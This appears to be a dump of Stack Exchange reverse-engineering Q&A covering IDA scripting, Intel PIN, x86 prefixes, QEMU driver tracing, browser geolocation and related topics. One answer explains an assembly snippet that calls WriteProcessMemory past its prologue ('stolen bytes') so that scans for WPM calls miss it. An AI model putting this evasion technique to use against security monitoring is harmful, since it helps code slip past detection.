<pre><code>def create_string(self, _startea, _endea, _segname="".const"", _unicode=False):

        if (SegStart(_startea) == idc.BADADDR):
            self.create_data_segment(_startea, _endea, "".const"")
        else:
            segtype = GetSegmentAttr(_startea, SEGATTR_TYPE)
            if (segtype != IDAEngine.SEG_TYPE_DATA):
                DelSeg(_startea, 0)
                self.create_data_segment(_startea, _endea, _segname)

        result = MakeStr(_startea, _endea)
        if (result == IDAEngine.FAIL):
            print ""[-] Failed to create a string at 0x{:x} to 0x{:x}."".format(_startea, _endea)
</code></pre>

<p>At this point, I believe the structure of the firmware is to blame (combination of bitness, lack of symbols and an obsolete but supported microprocessor), however I couldn't pinpoint the exact issue. For now, since I can use <code>find_strings()</code> to retrieve the offsets and then use <code>MakeStr</code> on strings with a certain length and the manually vetting the ""real"" strings. </p>

<h2>Final Remarks</h2>

<p>For posterity, I never really solved the issue, however I can confirm the underlying binary file was responsible for raising an exception in <code>get_ascii_contents2</code>. I've reloaded the same file, however as a raw binary file in one large segment and the function worked flawlessly. </p>
","<p>This took some digging, however it appears you're hitting an interesting edge case that the original author of the scripts didn't consider.</p>

<p><code>str(StringItem)</code> calls the following code inside <a href=""https://github.com/idapython/src/blob/0369202c370b9701cd2b2a46e63c2919bf0a7ba0/python/idautils.py#L509"" rel=""nofollow"">idautils.py</a>;</p>

<pre><code>    def __str__(self):
        return self._toseq(False)
</code></pre>

<p>Which leads to <code>_toseq</code> in <a href=""https://github.com/idapython/src/blob/0369202c370b9701cd2b2a46e63c2919bf0a7ba0/python/idautils.py#L496"" rel=""nofollow"">idautils.py</a>;</p>

<pre><code>    def _toseq(self, as_unicode):
        if self.is_2_bytes_encoding():
            conv = idaapi.ACFOPT_UTF16
            pyenc = ""utf-16""
        elif self.is_4_bytes_encoding():
            conv = idaapi.ACFOPT_UTF8
            pyenc = ""utf-8""
        else:
            conv = idaapi.ACFOPT_ASCII
            pyenc = 'ascii'
        strbytes = idaapi.get_ascii_contents2(self.ea, self.length, self.type, conv)
        return unicode(strbytes, pyenc, 'replace') if as_unicode else strbytes
</code></pre>

<p>If we dig into the <code>get_ascii_contents2</code> inside <a href=""https://github.com/idapython/src/blob/master/pywraps/py_bytes.hpp#L186"" rel=""nofollow"">py_bytes.hpp</a> method we see that this method could actually return a <code>NoneType</code> if <code>get_ascii_contents2</code> fails;</p>

<pre><code>if ( !get_ascii_contents2(ea, len, type, buf, len+1, &amp;used_size, flags) )
{
  qfree(buf);
  Py_RETURN_NONE;
}
</code></pre>

<p>Essentially, the code is fine, however you should add a check or exception handling if a <code>str(StringItem)</code> returns the with a <code>TypeNone</code> since it is possible for this type of value to be returned.</p>

<p>You could help debug further by providing what the hex data is at <code>ea</code> of <code>0x208e</code> with the length of <code>8</code> as shown in your output;</p>

<pre><code>208e: len=8 type=3 index=0-&gt;
</code></pre>
","11106"
"Relocate load address of main module IDA","665","","<p>is it possible when performing static analysis with IDA to change the default load address of the module (ie 0x00400000 in most cases depending on PE preferences) ? I think I read a book on IDA 1 year ago which taught me how to, however with googling around and browsing in IDA i didn't find anything.</p>
","<p>Passing confirmed answer from the comment:</p>

<p>See Edit-->Segments-->Rebase program menu item in Ida.
Online help on this menu item is <a href=""https://www.hex-rays.com/products/ida/support/idadoc/1408.shtml"" rel=""nofollow noreferrer"">here</a>.</p>
","14920"
"Intel PIN: How to access the INS object from inside an analysis function?","664","","<p>A typical PIN code snippet looks like this (taken from the <a href=""https://software.intel.com/sites/landingpage/pintool/docs/76991/Pin/html/index.html#IAddressTrace"" rel=""nofollow"">official manual</a>):</p>

<pre><code>// This function is called before every instruction is executed
// and prints the IP
VOID printip(VOID *ip) { fprintf(trace, ""%p\n"", ip); }

// Pin calls this function every time a new instruction is encountered
VOID Instruction(INS ins, VOID *v)
{
    // Insert a call to printip before every instruction, and pass it the IP
    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)printip, IARG_INST_PTR, IARG_END);
}
</code></pre>

<p>I just can't figure out how to access the <code>ins</code> object from within <code>printip(VOID *p)</code>. The other way round seems easy, i.e. getting the IP from from the <code>ins</code> object:</p>

<p><code>INS_Address (INS ins)</code>(see <a href=""https://software.intel.com/sites/landingpage/pintool/docs/76991/Pin/html/group__INS__BASIC__API__GEN__IA32.html#gd3b5f975c84b126531b38930b94b5544"" rel=""nofollow"">here</a>)</p>

<p>I tried passing a <code>INS *ins</code> pointer to <code>printip(VOID *ip, INS *ins)</code> ins via <code>IARG_PTR, &amp;ins</code> but this ended in either casting errors or Segmentation faults.</p>

<p>How can I access the <code>ins</code> object (type <code>INS</code>) from inside an analysis function?</p>

<p><strong>Side note:</strong> I got to this problem when trying to call <code>INS_Disassemble (INS ins)</code> for every executed instruction.</p>
","<p>You may note that <code>printip</code> is a function pointer, it is lazily called internally by <code>Pin</code>; moreover <code>ins</code> is an <em>automatic variable</em> (it is passed into <code>Instruction</code> from the stack). Consequently, passing <code>&amp;ins</code> into <code>printip</code> (through <code>IARG_PTR</code>), then using it will lead to segmentation faults.</p>

<p><code>Pin</code> declares <code>INS</code> by specializing the class template <code>INDEX</code>, as you can observe the following declaration in <code>type_core.TLH</code>:</p>

<pre><code>/*! @ingroup INS_BASIC_API
Handle for INS */  
typedef class INDEX&lt;6&gt; INS;
</code></pre>

<p>where <em>constructors and assignment operators</em> of class template <code>INDEX</code> are both default. So, <em>in principle</em>^^, we can always declare a persistent variable to share an object of <code>INS</code> between instrumentation and analysis functions, for example:</p>

<pre><code>static INS per_ins;
...
VOID Instruction(INS ins, VOID *v)
{
  per_ins = ins;
  ...
}
...
VOID printip(VOID *ip)
{
  INS_Disassemble(per_ins);
}
</code></pre>

<p>This method does not work, unfortunately, this is an example for ""well-typed program still can go wrong"" in <code>C/C++</code>^^. Since <code>Pin</code> does not guarantee that internal variables, accessed by an object of type <code>INS</code>, are persistent in <em>analysis time</em>, the result of calling <code>INS_Disassemble(per_ins)</code> in an <em>analysis function</em> can be meaningless.</p>

<p>For your case, you may not want to call <code>INS_Disassemble(ins)</code> each time <code>ins</code> executes. We don't need that, for example, if <code>ins</code> is in a loop then this function will be called multiple times (with the same <code>ins</code>) to get the same result.</p>

<p>All <strong>static information</strong> of an instruction (e.g. the disassembled form of <code>ins</code> in this case) should be obtained in <em>instrumentation time</em>. Particularly, <code>INS_Disassemble</code> should be called single time only in some instrumentation function. One way to obtain the same effect as you want is:</p>

<pre><code>static std::unordered_map&lt;ADDRINT, std::string&gt; str_of_ins_at;

VOID Instruction(INS ins, VOID *v)
{
  str_of_ins_at[INS_Address(ins)] = INS_Disassemble(ins);
  ...
}

VOID printip(VOID *ip, ADDRINT addr) 
{
  std::string ins_str = str_of_ins_at[addr];
  ...
}
</code></pre>
","12410"
"Right order of function arguments","663","","<p>i have the following function with three arguments:</p>

<pre><code> sub_602667B proc near 

 arg_0 = dword ptr 4
 arg_4 = dword ptr 8
 arg_8 = dword ptr 0Ch

 push    [esp+arg_8]
 push    [esp+4+arg_4]
 push    15
 push    [esp+0Ch+arg_0]
</code></pre>

<p>Then I make the following sketch : </p>

<pre><code> esp, ebp -&gt; | Old EBP        |  +0
             | Return Address |  +4
             | Argument 1     |  +8
             | Argument 2     |  +12
             | Argument 3     |  +16
</code></pre>

<p>And now I have the following on my paper:</p>

<pre><code>   push    [esp+arg_8]     =&gt; is Argument 2,( because esp + 12(=0Ch) = Argument 2
   push    [esp+4+arg_4]   =&gt; is Argument 2,( because esp + 4 + 8 = Argument 2 )
   push    15
   push    [esp+0Ch+arg_0] =&gt; is Argument 3,( because esp + 12 + 4 = 16 = Argument 3
</code></pre>

<p>So my question would be : Is that sketch ok? I wanted to ask because the point that Argument 2 is pushed twice and Argument 1 is not taken surprises me </p>
","<p>Your code snippet does not contain <code>push esp, ebp</code>, so why would there be an ""old EBP"" on the stack? At the beginning of the function, your stack should look like this:</p>

<pre><code>esp + 00 | return address
esp + 04 | Argument 1 (arg_0)
esp + 08 | Argument 2 (arg_4)
esp + 0C | Argument 3 (arg_8)
</code></pre>

<p>After that, remember that <code>esp</code> changes after each <code>push</code>. IDA is already doing the maths for you and splitting the displacement into the <code>+4</code> and <code>+arg_4</code> parts — they represent ""balance <code>esp</code> back to its initial value"" and ""convert the remaining offset to a local variable"", respectively. The function is pushing exactly those variables which are referenced:</p>

<pre><code>push    [esp+arg_8]      ; Argument 3
push    [esp+4+arg_4]    ; Argument 2
push    15
push    [esp+0Ch+arg_0]  ; Argument 1
</code></pre>

<hr>

<p>If you want to find out more, you can highlight the <code>[esp+4+arg_4]</code> part in the disassembly and press <kbd>Q</kbd> to convert the displacement to a single number.</p>

<p>Then go to Options > General... > Disassembly and enable the <code>Display disassembly line parts: [x] Stack pointer</code> setting. </p>

<p>Now you see the difference between the <code>esp</code> value at the start of the function and the <code>esp</code> value in the current line.</p>

<p>Subtract that difference from the displacement in the <code>push</code>, and you should get the right local variable.</p>
","6274"
"How much time would it take to reverse engineer 100,000 lines of disassembly?","662","","<p>I'm trying to get a sense of the amount of time it takes to RE something, but I'm going to try to make this question as least subjective as possible.</p>

<p>Imagine a very simple application that has only 100,000 lines of disassembly. Maybe it's a game like flappy bird, draws things to screen, a little physics, gets input, game mechanics, etc. Now imagine this in x86 disassembly with with highest optimization used, no debug symbols. </p>

<p>For a reverse engineer who is moderately skilled, what is an estimate on the time it might take such an engineer to go through the assembly and understand how the app works.</p>

<p>edit: To add more constraint, what I mean by ""understand how the app works"", I mean, know it well enough to create a near replica of the application using mostly the same implementation details. Flappy bird is a bad example because you can play it and you already have an idea of what it does. Pretend you don't know how it works.</p>
","<p>The amount of time needed to understand assembly code does not grow linear. For example: You can understand a simple function with 10 lines of assembly relatively quickly (lets say 4-5 minutes). As the code grows the more complex it is to understand the code: You need to catch how different functions work together, so the equation does not result in 8-10 minutes.</p>

<p>As L. Resnik made clear the amount of time vastly depends on the complexity of the code, but this is roughly the same for every standard application I would say. </p>

<p>Understanding 100,000 lines of C code takes several weeks (Guess! I did never try to understand 100,000 lines of C code before), depending on the time you're actually working. With this basis I guess it takes several months with smart analysis. Of course ""several"" is wide-ranged, but I do not think you could answer anything more precise.</p>

<p>Feel free to add something, as these are just my first thoughts.</p>
","10809"
"How to identify HTML5 geolocation protocol of a browser?","662","","<p>I've been trying to figure how a html5 browser like chrome or firefox performs geolocation under the hood but I'm running into some difficulties.</p>

<h2>Difficulties</h2>

<p>To be more precise, I want to know what happens when a piece of javascript calls <code>navigator.geolocation.getCurrentPosition (success_func)</code> but <em>before</em> <code>success_func</code> actually gets called back. I want to know how the browser goes about obtaining the latitude and longitude coordinates. What's the protocol it uses? What servers does it query to obtain this information? etc.</p>

<p>Here's what I have determined and tried:</p>

<ul>
<li>Chrome and Firefox uses the MAC of nearby wifi access points to obtain geolocation by sending it to googlesapi.com. It is this MAC-wifi based implementation I am most interested in.</li>
<li>By the time <code>success_func</code> gets called, the browser has already obtained the geolocation data.</li>
<li>I made limited progress using proxy and packet captures like tcpcatcher and wireshark. I see a query is being made to <code>googleapis.com:443</code> but of course it's over tls/ssl which means I can't read it. (using ssl monitor in tcpcatcher causes geoloc to fail in browser)</li>
<li>I tried using builtin devtool and console in browser but it seems to omit the communication that grabs the geoloc data. For example, using chrome's devtool (<kbd>ctrl</kbd>+<kbd>shift</kbd>+<kbd>I</kbd>), it does not show any <code>CONNECT</code> methods or connections to <code>googleapis.com</code> even though tcpcatcher clearly captures that during geolocation.</li>
<li>I've tried looking at the source to determine this but not having much luck. The problem is that browser codebases are just humongous and locating the pertinent class and source files would be difficult especially since I'm unfamiliar with their overall design. grepping for interesting keywords only goes so far.</li>
</ul>

<p>If you guys were trying to determine and reverse the protocol a given browser uses to implement geolocation how would you guys proceed?</p>

<h2>Other Resources</h2>

<p>Here are some things I've already looked at that I found helpful:</p>

<ul>
<li><a href=""http://samy.pl/mapxss/"" rel=""nofollow noreferrer"">http://samy.pl/mapxss/</a></li>
<li><a href=""https://stackoverflow.com/questions/3041113/how-exactly-does-html5s-geolocation-work"">https://stackoverflow.com/questions/3041113/how-exactly-does-html5s-geolocation-work</a></li>
</ul>

<p>The problem is some of the info mentioned there is out-of-date and no longer accurate. My aim now is to figure out exactly what changed and how an external custom application can use this protocol itself for geolocation.</p>
","<p>For Firefox (i.e. Gecko) and Chrome (i.e. Blink) you can just look in the source code:</p>

<p>Searching the Firefox codebase for <code>getCurrentPosition</code> yields the source file <a href=""http://dxr.mozilla.org/mozilla-central/source/dom/src/geolocation/nsGeolocation.cpp#697"" rel=""nofollow"">nsGeolocation.cpp</a>. As you see in the linked source line, it creates an instance of a geolocation provider. Assuming Firefox for Desktop, there is only the <a href=""http://dxr.mozilla.org/mozilla-central/source/dom/system/NetworkGeolocationProvider.js"" rel=""nofollow"">NetworkGeolocationProvider</a> (FirefoxOS may also use GPS).</p>

<p>In essence, Gecko opens an XMLHttpRequest to the URL specified in <code>about:config</code> as <code>geo.wifi.uri</code>. Per default this is <code>https://www.googleapis.com/geolocation/v1/geolocate?key=%GOOGLE_API_KEY%</code>.</p>

<p>Blink performs its http request in <a href=""https://code.google.com/p/chromium/codesearch#chromium/src/content/browser/geolocation/network_location_request.cc"" rel=""nofollow"">network_location_request.cc</a>, with the same API endpoint defined as in Firefox (cf. <a href=""https://code.google.com/p/chromium/codesearch#chromium/src/content/browser/geolocation/location_arbitrator_impl.cc&amp;rcl=1407097784&amp;l=43"" rel=""nofollow"">location_arbitrator_impl.cc</a>).</p>

<p>(NB: I looked at Gecko HG revision a4f779bd7cc2 and Blink SVN revision 287303)</p>
","6009"
"Ida Plugin Batch analysis issue.","662","","<p>I overcame recent issues with a redefinition and finished my Plugin.</p>

<p>In short this plugin uses Hex-Rays Decompiler to decompile a given file, analyzes properties of the pseudocode and then appends the results to a <code>.csv</code></p>

<p>Now I tried to use this in batch mode, but was stumped as the following happened:</p>

<p>Cmd input to call IDA:</p>

<pre><code>idaw -A -c -Srecompile.idc input_file
</code></pre>

<p>The <code>recompile.idc</code> file:</p>

<pre><code>#include &lt;idc.idc&gt;
static main() {
Wait();
Message(""Hello world from IDC!\n"");
RunPlugin(""REcompile vs Hexrays"",0); 
//Exit(0);
}
</code></pre>

<p>I obviously need to <code>Wait()</code> for Auto-Analysis. <code>Exit()</code> is commented since it's for use when this is all fixed.</p>

<p>Now i do get the following output on execution:</p>

<pre><code>The initial autoanalysis has been finished.
Hello world from IDC!

LoadLibrary(C:\Program Files (x86)\IDA\plugins\REcompile vs Hexrays.plw) error: Das angegebene Modul wurde nicht gefunden.
C:\Program Files (x86)\IDA\plugins\REcompile vs Hexrays.plw: can't load file
Hex-Rays Decompiler plugin has been loaded (v1.6.0.111005)
Hex-rays version 1.6.0.111005 has been detected, REcompile vs Hexrays ready to use
</code></pre>

<p>As you can see the script is executed before the plugins are loaded. I assume this is the reason why I get the <code>LoadLibrary</code> Error.</p>

<p>If you have any other input or experience with plugin batch execution i'd be happy to hear from you.</p>

<p>Greetings, 
Viktor</p>
","<p>Have you tried manually loading the Hex-Rays plugin before loading your plugin?</p>

<p>For example:</p>

<pre><code>#include &lt;idc.idc&gt;
static main() {
    Wait();
    Message(""Hello world from IDC!\n"");
    RunPlugin(""hexrays"",0);
    RunPlugin(""REcompile vs Hexrays"",0); 
    //Exit(0);
}
</code></pre>
","5932"
"GAS/x86 disassembled a bare gs register as an instruction, is it a bug?","660","","<p>I encountered a strange x86-32 instruction (opcode <code>0x65</code>) decoded by <code>objdump</code> as <code>gs</code> (not <code>%gs</code> but <code>gs</code>). I found it while a full linear sweep of a binary (<code>objdump -D</code>), so the decoding was surely incorrect. But, still, <code>objdump</code> didn't decode it as a <code>(bad)</code> instruction, so it means that it can be encountered and I would like to know what does it means.</p>

<p>Here is an example of this instruction:</p>

<pre><code>080484fc &lt;_IO_stdin_used&gt;:
 80484fc:       01 00                   add    %eax,(%eax)
 80484fe:       02 00                   add    (%eax),%al
 8048500:       48                      dec    %eax
 8048501:       65                      gs     &lt;======================= Here!!!
 8048502:       6c                      insb   (%dx),%es:(%edi)
 8048503:       6c                      insb   (%dx),%es:(%edi)
 8048504:       6f                      outsl  %ds:(%esi),(%dx)
 8048505:       20 57 6f                and    %dl,0x6f(%edi)
 8048508:       72 6c                   jb     8048576 &lt;_IO_stdin_used+0x7a&gt;
 804850a:       64 21 0a                and    %ecx,%fs:(%edx)
 804850d:       00 44 6f 64             add    %al,0x64(%edi,%ebp,2)
 8048511:       67 65 20 54 68          and    %dl,%gs:0x68(%si)
 8048516:       69                      .byte 0x69
 8048517:       73 21                   jae    804853a &lt;_IO_stdin_used+0x3e&gt;
</code></pre>

<p>Note that searching for this instruction on the Web is quite difficult because of the <code>%gs</code> register which mask all other possible hit.</p>

<p>So, is it a real ""instruction"" or is it glitch produced by <code>gas</code> ?</p>
","<p>Strictly speaking it's not an instruction. It's the segment override prefix (prefixes are considered to be part of the instruction).</p>

<p>Most memory accesses use <code>DS</code> segment selector by default except those involving <code>ESP</code> or <code>EBP</code> register (they default to <code>SS</code>) and some ""string"" instructions (<code>movs</code>, <code>scas</code> etc). Segment override prefixes allow you to use another segment selector to access your data. E.g. in DOS times the <code>CS</code> override was commonly used to access data stored in the code segment (such as jump tables):</p>

<pre><code>seg001:00EA shl bx, 1 ; SWITCH
seg001:00EC jmp cs:off_13158[bx] ; switch jump
...
seg001:0588 off_13158  dw offset loc_12DD7 ; DATA XREF: _main+E6r
seg001:0588            dw offset loc_12DE5 ; jump table for switch statement
seg001:0588            dw offset loc_12DE5
seg001:0588            dw offset loc_12DE5
</code></pre>

<p>The 80386 added two extra segment registers (<code>GS</code> and <code>FS</code>) and the corresponding prefixes.</p>

<p>Since the <code>GS</code> prefix does not actually affect the following instruction (<code>insb</code>) in the code snipped above, GAS opted out for printing it on a separate line.</p>

<p>In some of the following instructions you can see how it affects the disassembly:</p>

<pre><code>64 21 0a       -&gt;  and %ecx, %fs:(%edx)
^^                           ^^^
67 65 20 54 68 -&gt; and %dl, %gs:0x68(%si)
   ^^                      ^^^
</code></pre>

<p>BTW, 67 is another prefix, this time the <em>address size</em> override. It is why the instruction uses the 16-bit <code>SI</code> register and not the full <code>ESI</code>.</p>
","2679"
"Interacting with command line programs in Hopper disassembler (Mac OS 10.9)","658","","<p>To test the debugging capabilities of Hopper, I wrote a simple C++ command line application, and tried to run it on the remote debugging server (with gdb). However, I learned after I failed to be able to interact with the application, from the author, that the Hopper server does not support CL apps currently. In other words, it seems the app has to have its own GUI.</p>

<p>Are there any workarounds for this? Specifically, is there a way I can write a standalone C++ Mach-O executable which has its own version of terminal built into it (without all the features, just an interpreter)?</p>
","<p><strong>Update:</strong> Admirably, after just a few days after I sent in a request to include a feature to send input to command line applications, the sole developer of Hopper disassembler has included the feature. Notice the new 'application output' tab in the new Hopper disassembler 3.3.3:</p>

<p><img src=""https://i.stack.imgur.com/0ltS7.png"" alt=""enter image description here""></p>
","5885"
"How could using QEMU be useful in developing a driver for Linux?","657","","<p>Presently, I am trying to analyze a piece of hardware, to be specific the Broadcom 1570 PCI web cam inside a late MBPr 2013.  I can pass through the device using QEMU, and have the gusest OS / VM detect the web cam, and I tested it out using FaceTime, and it appears to be working.  However, there currently isn't a Linux driver for this device.  I am aware of one being developed, and there is a project page on Github for the device.</p>

<p>What are some ""attack vectors"" or possibilities of using qemu to aid in the development of a Linux driver for this device?  My knowledge with QEMU is limited, but I have successfully set up several VM's on my host Linux machince (MBPr), and I am eager to learn.  Any help would be greatly appreciated.</p>
","<p>To develop a driver, there's basically 3 steps you have to do:</p>

<ol>
<li>Learn about Linux driver programming in general. This is independent of your specifi hardware, and involves things like ""How do i convert virtual memory addresses to physical and back? How do i read bytes / write bytes to hardware registers? How do i yield the CPU while waiting for the hardware to set a bit? If the device is interrupt-driven, how to i ""stop"" execution of the driver when it has written a command to the device, and how to i ""restart"" it when the device uses an interrupt to tell me the command has finished/data is ready for me to process?</li>
<li>Learn how the hardware works. How many and which registers does it have, what's the meaning of the individual bits of those registers, what do i have to write to which register to configure the hardware, how (in the case of a web cam) do i read a pixel from the hardware, and how do i set up a DMA transfer of a whole image to memory?</li>
<li>Apply the knowledge of 1) and 2) to your hardware, write a driver, and debug it if it doesn't work as it should. If your user level software tells the driver to configure the Webcam to 1024x768 pixels, does the driver write the correct data to the correct registers? Does it obey any timing the device imposes, or does it set your registers too fast sometimes?</li>
</ol>

<p>While 1) ist just a lot of reading and understanding documentation, an emulator might be able to help with 2), and certainly with 3).</p>

<p><strong>Learn how the hardware works</strong></p>

<p>If you're lucky, you can do 2) looking at vendor's datasheets. In your case, it seems like the vendor (Broadcom) hasn't published anything, so the only way to find out is looking at what an existing driver does. This is where an emulator <strong>that allows logging of certain actions</strong> might come handy.</p>

<p>If you're running MacOS under Qemu under Linux, and the MacOS driver accesses the webcam hardware, then it doesn't really access the hardware. Every hardware access goes to Qemu, which will intercept the access and route it to the real hardware. Each of these actions can be logged. Now, you can fire up some software in your MacOS, and, for example, tell it to set the resolution to 1024x768 pixels. This might result in a QEMU log like this:</p>

<pre><code>Write the value 01 to the memory address 1234500
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x00
Write the value 00 to the memory address 1234502
Write the value 04 to the memory address 1234503
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x00
Write the value 02 to the memory address 1234500
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x00
Write the value 00 to the memory address 1234502
Write the value 03 to the memory address 1234503
Read memory address 1234501 and get 0x80
Read memory address 1234501 and get 0x00
Write the value 00 to the memory address 1234500
</code></pre>

<p>What does this tell us?</p>

<p>Well, your resolution values - 1024x768 - are 0400 and 0300 in hex. This corresponds to the bytes that are written to 1234502 and 1234503. So, these seem to be the registers that set the resolution. But unfortunately, the <em>same</em> registers seem to be used for width and height. This probably means that the byte written to 1234500 is a selector - writing a 1 there turns the other 2 registers into ""height"" mode, writing a 2 turns them into ""width"" mode.</p>

<p>And what about the repeated reading of 1234501?</p>

<p>Every time, after something is written to the device, bit 7 (0x80) of that register seems to be set, and the driver keeps reading it until it's clear; then proceeds to write some more. So it seems that bit is a ""hardware ready"" bit, meaning the hardware is processing your previous commands, and not able to accept further commands. Once everything is processed, the bit gets cleared, and the driver is allowed to write some more.</p>

<p>Of course, all of this would be much easier if you had documentation of the actual hardware. But, documentation of <em>similar</em> hardware might still help. Assume there was a different chip, the Broadcom 1571, which had a USB interface. And assume the documentation of that stated ""To set the resolution to 1024x768, you'll have to send the bytes <code>0x01 0x00 0x04 0x02 0x00 0x03 0x00</code> over USB"". You'd see that the byte sequence is the same, but the timing stuff is probably handled by the USB controller of the 1571 Chip. So you could easily translate the instruction ""To turn on the LED, send <code>0x04 0x01 0x00</code>, to turn it off send <code>0x04 0x00 0x00</code>"" to the corresponding PCI register sequence, and verify using your QEMU log whether or not the driver does the same thing when you turn the LED on/off from your emulated software.</p>

<p><strong>Develop the driver</strong></p>

<p>Once you have enough information about the hardware, you can start writing the linux driver. At this point, an emulator can help you in the same way as when you were tracing the other driver - running Linux with your driver in an emulator helps you debugging the code in just the same way as when you were tracing the original driver.</p>

<p>Also, you can use the emulator to prevent lots of crashes. Your driver might have some bugs that cause it to write bad data to bad addresses, and you certainly want to prevent it from sending a low level format command to the PCI/SATA adapter. You can for example, use QEMU to pass through only a specific range of PCI registers to the actual hardware. Or, if your device documentation states ""Writing 0x01 to Register 7 sets a signal to ground, writing 0x02 sets it to +5V. Never set both bits at once, this will create a short circuit and fry your device within seconds"", you could put an appropriate safeguard into the emulator to prevent this in case of a driver gone wild.</p>

<p><strong>Can Qemu actually do what has been described?</strong></p>

<p>Probably not the vanilla version. There's no reference to PCI register logging in the qemu description. But, it seems that <a href=""https://github.com/koradlow/v4l2-rds-ctl/tree/master/contrib/pci_traffic"" rel=""nofollow"">there is a project on github to add this kind of logging to qemu</a>. This project hasn't been updated in 4 years, which could mean it still works as intended (and there has never been a reason to update it), or the maintainer lost interest and it doesn't work at all anymore.</p>

<p>Some of the other uses described are just too specific to be easily configurable, so you'll probably need to hack qemu itself to implement them. But hey, that's what qemu is open source for.</p>

<p>Since there is already a project to develop drivers for your camera, chances are the maintainers of that project have done exactly that. I'd contact them for more information.</p>
","8232"
"Making Visual C++ harder to reverse engineer","657","","<p>This is similar in nature to <a href=""https://reverseengineering.stackexchange.com/q/118/2044"">this question</a> and <a href=""https://reverseengineering.stackexchange.com/a/58/2044"">this question</a>; I'm interested in what compiler settings to enabled/disable to make a Visual C++ harder to reverse engineer.</p>

<p>Here's a few compiler flags I've already got which I believe should be set:<br>
<code><a href=""http://msdn.microsoft.com/en-us/library/vstudio/k1ack8f1.aspx"" rel=""nofollow noreferrer"">/Ox</a></code> Full optimization. This appears to be the equivalent of gcc's -O3<br>
<code><a href=""http://msdn.microsoft.com/en-us/library/vstudio/k1ack8f1.aspx"" rel=""nofollow noreferrer"">/Oy</a></code> Omit frame pointers. (x86 only)<br>
<code><a href=""http://msdn.microsoft.com/en-us/library/vstudio/we6hfdy0.aspx"" rel=""nofollow noreferrer"">/GR-</a></code> Disable Run Time Type Information<br>
<code><a href=""http://msdn.microsoft.com/en-us/library/vstudio/2kzt1wy3.aspx"" rel=""nofollow noreferrer"">/MT</a></code> flag is used to static link the various libraries.</p>

<p>Visibility - I don't think  the MSVC compiler has any options to turn off visibility like <code>-fvisibility=hidden</code> offered in gcc, but is this necessary for MSVC since the debugging symbols are stored in the PDB file?</p>

<p>Are there any other things I should include to ensure minimal information is distrubuted in the application?</p>

<p>(I might add that I am creating a standalone executable)</p>
","<p>You should disable /DEBUG (linker option), which is enabled by default even for Release configurations.</p>

<p>Note that although certain compiler/linker options will make reverse engineering your software slightly more difficult, they won't have much of an effect regarding overall reversability.</p>
","2267"
"Why does WriteProcessMemory in kernel32.dll do this? (ASM)","657","","<p>Someone said to do something like this to avoid scans for WPM calls: </p>

<pre><code>__declspec(naked) BOOL WINAPI SafeWriteProcessMemory(HANDLE hProcess,
    LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize,
    SIZE_T *lpNumberOfBytesRead)
{
    __asm
    {
            mov edi, edi
            push ebp
            mov ebp, esp
            pop ebp
            mov eax, WriteProcessMemory
            add eax, 6
            jmp eax
    }
}
</code></pre>

<p>I put it in a program and debugged it in olly. I looked at <code>kernel32.WriteProcessMemory</code>. We're using the <code>add eax, 6</code> to jump from here:</p>

<pre><code>MOV EDI,EDI                              ; BOOL kernel32.WriteProcessMemory(hProcess, ...)
PUSH EBP
MOV EBP,ESP
POP EBP
JMP &lt;JMP.&amp;API-MS-Win-Core-Memory-L1-1-0. ; Jump to KERNELBASE.WriteProcessMemory
</code></pre>

<p>To there. Effectively skipping over the instructions between the two. We're executing those instructions in our own call. But I don't understand why those instructions are being executed. We're pushing <code>EBP</code> onto the stack, moving <code>ESP</code> into <code>EBP</code>, then restoring <code>EBP</code> from the stack. That shouldn't actually be doing anything.</p>

<p>I debugged it instruction-by-instruction, and still can't figure out why it's being done.</p>

<p>Does it have something to do with Windows' useless <code>mov edi,edi</code>s at the beginning of functions to allow jump patching?</p>
","<p>This is the ""stolen bytes"" technique, where the first few bytes of the function are copied to a remote location and executed from there, then the original function is called from the location after the bytes that were copied.</p>

<p>The purpose of skipping the first few bytes of the function allows you to call the function body without being ""detected"".  That is, any code which detoured the function at exactly the start would be bypassed.</p>

<p>In your example, the EBP manipulation is meaningless.  Those instructions exist in the original function in order to provide a familiar signature for routines that, for example, detour the code (but which is presumably broken by also including the hot-patching support).  Note that the POP instruction did not exist in that location before Windows 7, with the introduction of the kernelbase.dll.  Previously, the real function body would have followed the MOV instruction.</p>
","8391"
"How antiviruses name malwares","656","","<p>While analyzing a binary online through the virustotal service , I found out that different AVs named the binaries differently.For instance, for that same binary Norman named it  Obfuscated_A, Symantec named it WS.Reputation.1 and another AV named it Malware-Cryptor.General.2 .Is there any specific naming convention adopted by the AVs?</p>
","<p>Different AV vendors use different naming conventions. Many of them describe these conventions on their websites. For example:</p>

<ul>
<li><a href=""http://www.microsoft.com/security/portal/mmpc/shared/malwarenaming.aspx"">http://www.microsoft.com/security/portal/mmpc/shared/malwarenaming.aspx</a></li>
<li><a href=""http://www.symantec.com/security_response/virusnaming.jsp"">http://www.symantec.com/security_response/virusnaming.jsp</a></li>
<li><a href=""http://www.avira.com/en/support-malware-naming-conventions"">http://www.avira.com/en/support-malware-naming-conventions</a></li>
</ul>

<p>AV vendors will sometimes try to use the same names as other AV vendors for well-known malware families, but this is not guaranteed and is becoming less and less common. For example, Microsoft, Sophos, CA, and McAfee all refer to the well-known Conficker family as ""Conficker"", but Symantec refers to it as ""Downadup"".</p>

<p>Even when AV vendors agree on a family name, they will hardly ever be in-sync on variant names. So for example, a file detected by Microsoft as Conficker.B might be detected by CA as Conficker.C.</p>

<p>This is why whenever you want to refer to a specific malware variant, it's always best to give the detection name <em>and</em> the AV engine name. Or better yet, just give the file hash and let people look it up on a site like VirusTotal.</p>
","3400"
"Obfuscating jar already obfuscated","656","","<p>I'm wondering what happens if we try to run a jar through Proguard that has already been obfuscated by another obfuscator or Proguard itself? Will the obfuscated class names and methods names be changed by the new obfuscator?</p>

<p>For example, I would like to have those names renamed to something simpler such as <code>a</code> or <code>aab</code> rather than unicode characters. Will another obfuscator change the names?</p>

<p><img src=""https://i.stack.imgur.com/LupVn.jpg"" alt=""enter image description here""></p>
","<p>It's reasonable to assume ProGuard (or any other alike software) <em>cannot tell</em> if a name is deliberately unclear or not. If it could, it would be reversible -- create 'sensible' names for those that it deemed unclear.</p>

